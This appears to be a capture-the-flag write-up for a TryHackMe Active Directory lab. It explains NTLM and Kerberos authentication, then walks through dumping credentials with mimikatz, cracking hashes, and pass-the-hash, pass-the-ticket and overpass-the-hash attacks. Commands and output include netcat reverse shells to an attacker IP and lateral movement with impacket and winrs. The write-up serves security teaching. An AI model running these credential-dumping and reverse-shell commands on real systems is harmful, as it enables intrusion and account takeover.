# Use of alternate authentication material

## NTLM authentication flow

| ![NTLM Auth Flow](../../_static/images/ntlm-auth.png) |
|:--:|
| This is for domain authentication. In local authentication, this process only occurs <br>between the client and server, as the server keeps the user's NTLM hash in the SAM |

* If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump 
the domain user's NTLM hash from memory by using a tool like `mimikatz` or other methods. The attacker could try to 
crack the hash(es) and user passwords. 
* User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without 
ever needing to know a password, called `pass-the-hash`. It does require dumping hashes locally or remotely.

## Kerberos authentication flow

Ticket Granting Ticket:

| ![Kerberos TGT Auth Flow](../../_static/images/kerberos-tgt.png) |
|:--:|
| As long as the session has not lapsed, the user can reuse the TGT as often as needed <br>to request a TGS. |

Ticket Granting Service:

| ![Kerberos TGS Auth Flow](../../_static/images/kerberos-tgs.png) |
|:--:|
| The TGS also has a service session key, and when the SP decrypts the ticket, the SP <br>will have a session key for the user. |

User Authentication:

| ![Kerberos TGS Auth Flow](../../_static/images/kerberos-user.png) |
|:--:|
| Deny/Allow |

Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal 
to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on 
behalf of a user.

* When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to 
create this key can be `DES` (disabled by default on newer Windows installations), `RC4`, `AES218`, or `AES256`, and can 
perhaps be extracted using `mimikatz`. If any of these keys are available on the host, then we can try to request a TGT 
as the user the `Pass-the-Key` way.
* The `RC4` hash is equal to a user's `NTLM` hash. If a users' NTLM hashes were dumped from LSASS during enumeration on 
a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a 
TGT the `Overpass-the-Hash` way.

## Cracking hashes

As a result of extracting credentials from a host where we have attained administrative privileges, we might get 
clear-text passwords, or hashes that can be easily cracked.

### NTLM hash (NTHash)

These hashes can be obtained by dumping the SAM database or using `mimikatz`. They are also stored on domain 
controllers in the `NTDS` file. These are the hashes that can be used to `pass-the-hash`.

Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash 
(at least in some places). 

Example:

    B4B9B02E6F09A9BD760F388B67351E2B

The algorithm:

    MD4(UTF-16-LE(password))

`UTF-16-LE` is the little endian `UTF-16`. Windows used this instead of the standard big endian.

Cracking:

    john --format=nt hash.txt
    hashcat -m 1000 -a 3 hash.txt

### NTLMv1 (Net-NTLMv1) hash

The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses 
both the NT and LM hash, depending on configuration and on what is available. 

A way of obtaining a response to crack from a client, `responder` can be used. The value to crack would be the 
`K1 | K2 | K3`. Version 1 is deprecated, but might still be used in some old systems on the network.

Example

    u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c

The algorithm:

    C = 8-byte server challenge, random
    K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
    response = DES(K1,C) | DES(K2,C) | DES(K3,C)

Cracking:

    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt

### NTLMv2 (Net-NTLMv2) hash

The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as 
NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with `responder`. This is 
the Default in Windows since Windows 2000.

Example:

    admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030

The algorithm:

    SC = 8-byte server challenge, random
    CC = 8-byte client challenge, random
    CC* = (X, time, CC2, domain name)
    v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
    LMv2 = HMAC-MD5(v2-Hash, SC, CC)
    NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
    response = LMv2 | CC | NTv2 | CC*

Cracking:

    john --format=netntlmv2 hash.txt
    hashcat -m 5600 -a 3 hash.txt

## Pass-the-hash (PtH)

The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of 
having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash 
for authentication.

Assuming NTLMv2, To extract NTLM hashes, use `mimikatz` to read the local SAM or extract hashes directly from `LSASS` 
memory.

Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain 
user hashes will be available.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    
    mimikatz # lsadump::sam

Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has 
recently logged onto the machine.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    
    mimikatz # sekurlsa::msv 

The extracted hashes can be used in a PtH attack by using `mimikatz` to inject an access token for the target user 
on a reverse shell (or any other command):

    mimikatz # token::revert

    mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe <IP attack machine> 5555"

`token::revert` reestablishes the original token privileges, because trying to pass-the-hash with an elevated token 
will not work.

Run a reverse listener on the attack machine:

    nc -lnvp 5555

Running the `whoami` command on this shell, it will still show the original user from before doing the PtH, but any 
command run from here will use the credentials thet were injected.

Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are
available, try:

Connect to RDP using PtH:

    xfreerdp /v:<IP target> /u:<domainname>\\<username> /pth:<ntlmhash>

Connect via psexec using PtH:

    psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target>

Note: Only the linux version of `psexec` supports PtH.

Connect to WinRM using PtH:

    evil-winrm -i <IP target> -u <username> -H <ntlmhash>

## Pass-the-ticket

It may be possible to extract Kerberos tickets and session keys from `LSASS` memory using `mimikatz`. This usually 
requires having `SYSTEM` privileges on the attacked machine:

    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export

Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account 
(only the ones assigned to that account).

We need the ticket and its corresponding session key. Inject the ticket into the current session:

    mimikatz # kerberos::ptt <ticket>

Where `ticket` looks something like:

    [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be 
available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the 
`mimikatz` session and:

    za\user.name@THMJMP2 C:\> klist

## Overpass-the-hash/Pass-the-key

This attack is similar to PtH but then for Kerberos networks.

Obtain the Kerberos encryption keys from memory with mimikatz:

    mimikatz # privilege::debug
    mimikatz # sekurlsa::ekeys

Get a reverse shell. Depending on the available keys:

RC4:

    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe <IP attack machine> 5556"

AES128 hash:

    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe <IP attack machine> 5556"

If we have the AES256 hash:

    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe <IP attack machine> 5556"

To receive the reverse shell, run a listener on the attack machine:

    nc -nlvp 5556

## Flags

The given credentials will grant t2 administrative access to THMJMP2, allowing for the use of mimikatz to dump the 
authentication material needed for any of the applied techniques. Both mimikatz and psexec64 are available at 
`C:\tools` on THMJMP2. Perform a Pass-the-Hash, Pass-the-Ticket or Pass-the-Key against domain user t1_toby.beck and 
get the flag.

Using an `ssh` session:

    ssh t2_felicia.dean@za.tryhackme.com@thmjmp2.za.tryhackme.com

Start `mimikatz`:  

    za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>powershell                  
    Windows PowerShell                                                              
    Copyright (C) 2016 Microsoft Corporation. All rights reserved.                  
    
    PS C:\Users\t2_felicia.dean> cd C:/Tools 

    PS C:\Tools> ./mimikatz.exe                                                     

      .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                    
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                     
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )        
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                         
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/       


Elevate privileges:

    mimikatz # privilege::debug                                                     
    Privilege '20' OK

```text
mimikatz # token::elevate                                                       
Token Id  : 0                                                                   
User name :                                                                     
SID name  : NT AUTHORITY\SYSTEM                                                 

504     {0;000003e7} 1 D 16943          NT AUTHORITY\SYSTEM     S-1-5-18        
(04g,21p)       Primary                                                         
 -> Impersonated !                                                              
 * Process Token : {0;0012e3cf} 0 D 1265501     ZA\t2_felicia.dean      S-1-5-21
-3330634377-1326264276-632209373-4605   (12g,24p)       Primary                 
 * Thread Token  : {0;000003e7} 1 D 1345000     NT AUTHORITY\SYSTEM     S-1-5-18
(04g,21p)       Impersonation (Delegation) 
```

Dump any cached NTLM hashes from the LSASS process memory:

```text
mimikatz # sekurlsa::msv

...
Authentication Id : 0 ; 398808 (00000000:000615d8)                              
Session           : RemoteInteractive from 3                                    
User Name         : t1_toby.beck5                                               
Domain            : ZA                                                          
Logon Server      : THMDC                                                       
Logon Time        : 10/14/2022 9:28:50 PM                                       
SID               : S-1-5-21-3330634377-1326264276-632209373-4620               
        msv :                                                                   
         [00000003] Primary                                                     
         * Username : t1_toby.beck5                                             
         * Domain   : ZA                                                        
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                          
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                  
         * DPAPI    : 0537b9105954f5d1d1bc2f1763d86fd6 
...
```

### Inject with mimikatz

Using an ssh session mimics a reverse shell, but we can not use `/run:"cmd.exe"` because we can not spawn a sub-shell.
Instead, `sekurlsa::pth` is going to inject `t1_toby.beck`'s NTLM hash into the cmd.exe reverse shell back to Kali:

First, start a listener on the attack machine:

    sudo nc -lnvp 6666

Inject:

```text
mimikatz # token::revert                                                        
 * Process Token : {0;0012e3cf} 0 D 1265501     ZA\t2_felicia.dean      S-1-5-21
-3330634377-1326264276-632209373-4605   (12g,24p)       Primary                 
 * Thread Token  : no token                                                                             

mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1
bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.50.65.95 6666 
user    : t1_toby.beck                                                          
domain  : za.tryhackme.com                                                      
program : C:\tools\nc64.exe -e cmd.exe 10.50.65.95 6666                         
impers. : no                                                                    
NTLM    : 533f1bd576caa912bdb9da284bbc60fe                                      
  |  PID  9372                                                                  
  |  TID  9424                                                                  
  |  LSA Process is now R/W                                                     
  |  LUID 0 ; 1632307 (00000000:0018e833)                                       
  \_ msv1_0   - data copy @ 0000015AF0327BF0 : OK !                             
  \_ kerberos - data copy @ 0000015AF1138A28                                    
   \_ aes256_hmac       -> null                                                 
   \_ aes128_hmac       -> null                                                 
   \_ rc4_hmac_nt       OK                                                      
   \_ rc4_hmac_old      OK                                                      
   \_ rc4_md4           OK                                                      
   \_ rc4_hmac_nt_exp   OK                                                      
   \_ rc4_hmac_old_exp  OK                                                      
   \_ *Password replace @ 0000015AF112E8C8 (32) -> null   
```

On the attack machine the shell is received:

```text
$ sudo nc -lnvp 6666
[sudo] password for nina: 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.200.71.249.
Ncat: Connection from 10.200.71.249:50997.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

Having a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. 
Since t1_toby.beck's credentials are already injected in your session as a result of the attacks, you can use `winrs` 
without specifying any credentials, and it will use the ones available to the current session:

    C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
    winrs.exe -r:THMIIS.za.tryhackme.com cmd
    Microsoft Windows [Version 10.0.17763.1098]
    (c) 2018 Microsoft Corporation. All rights reserved.

The flag is on t1_toby.beck's desktop on THMIIS. 

    C:\Users\t1_toby.beck>cd Desktop
    cd Desktop

    C:\Users\t1_toby.beck\Desktop>dir
    dir
     Volume in drive C is Windows
     Volume Serial Number is 1634-22A9
    
     Directory of C:\Users\t1_toby.beck\Desktop
    
    06/17/2022  08:01 PM    <DIR>          .
    06/17/2022  08:01 PM    <DIR>          ..
    06/15/2022  11:29 PM            58,368 Flag.exe
                   1 File(s)         58,368 bytes
                   2 Dir(s)  46,545,506,304 bytes free
    
    C:\Users\t1_toby.beck\Desktop>Flag.exe

### Impacket from kali

```text
$ impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
za\t1_toby.beck

C:\>hostname
THMIIS

C:\>
```

## Kerberos

Dump:

    mimikatz # sekurlsa::tickets /export 
    ...

In another ssh session:

    za\t2_felicia.dean@THMJMP2 C:\tools>dir                                         
     Volume in drive C has no label.                                                
     Volume Serial Number is F4B0-FCB9                                              
    
     Directory of C:\tools                                                          
    
    ...                                                    
    10/14/2022  10:19 PM             1,685 [0;1d7a0d]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi                                                  
    10/14/2022  10:19 PM             1,537 [0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi                                                       
    ...                          

Back to mimikatz:

```text
mimikatz # kerberos::ptt [0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi                                                                     

* File: '[0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi': OK
```

Leave mimikatz and check:

    mimikatz # exit                                                                 
    Bye!                                                                            
    PS C:\Tools> klist                                                              
    
    Current LogonId is 0:0x12e3cf                                                   
    
    Cached Tickets: (1)                                                             
    
    #0>     Client: t1_toby.beck @ ZA.TRYHACKME.COM                                 
            Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                      
            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                    
            Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent nam
    e_canonicalize                                                                  
            Start Time: 10/14/2022 22:00:50 (local)                                 
            End Time:   10/15/2022 8:00:50 (local)                                  
            Renew Time: 10/21/2022 22:00:50 (local)                                 
            Session Key Type: RSADSI RC4-HMAC(NT)                                   
            Cache Flags: 0x1 -> PRIMARY                                             
            Kdc Called:        

Using winrs.exe:

    PS C:\Tools> winrs.exe -r:THMIIS.za.tryhackme.com cmd                           
    Microsoft Windows [Version 10.0.17763.1098]                                     
    (c) 2018 Microsoft Corporation. All rights reserved.                            
    
    C:\Users\t1_toby.beck>whoami                                                    
    whoami                                                                          
    za\t1_toby.beck                                                                 
    
    C:\Users\t1_toby.beck>hostname                                                  
    hostname                                                                        
    THMIIS                                                                          
    
    C:\Users\t1_toby.beck>